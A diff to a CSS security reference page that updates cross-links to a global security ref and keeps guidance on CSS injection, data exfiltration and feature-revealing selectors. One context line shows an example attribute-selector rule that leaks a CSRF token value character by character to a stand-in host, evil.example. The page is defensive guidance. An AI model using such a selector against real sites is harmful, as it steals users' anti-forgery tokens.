@@ -1,6 +1,10 @@
+---
+last_reviewed: 2026-10-18
+---
+
 # Security
 
-Use this ref when CSS crosses a trust boundary: user-generated styles, third-party stylesheets, values interpolated from input, or CSS that could leak application structure. This is the CSS-specific layer; the full treatment is in the security shelf (`securing-cascading-style-sheets`, `client-side-web-security`).
+Use this ref when CSS crosses a trust boundary: user-generated styles, third-party stylesheets, values interpolated from input, or CSS that could leak application structure. This is the CSS-specific layer; web security policy (CSP, headers, sanitization) lives in `global/refs/security.md`.
 
 ## CSS injection & data exfiltration
 
@@ -39,7 +43,7 @@ input[name="csrf"][value^="a"] { background: url(https://evil.example/leak?c=a);
 Descriptive, feature-named selectors leak your app's capabilities to anyone reading the CSS (`.deleteAllUsers`, `.exportUserData`, `.adminPanel`).
 
 - Prefer **structural or hashed** class names (CSS Modules `localIdentName`, build-time obfuscation) over feature-revealing names.
-- Don't ship a single global stylesheet containing selectors for **every** role — segment by role and enforce server-side access control before serving role-scoped CSS. Full guidance → security shelf `securing-cascading-style-sheets`.
+- Don't ship a single global stylesheet containing selectors for **every** role — segment by role and enforce server-side access control before serving role-scoped CSS. Policy → `global/refs/security.md`.
 
 ## Sanitizing user-generated styles
 
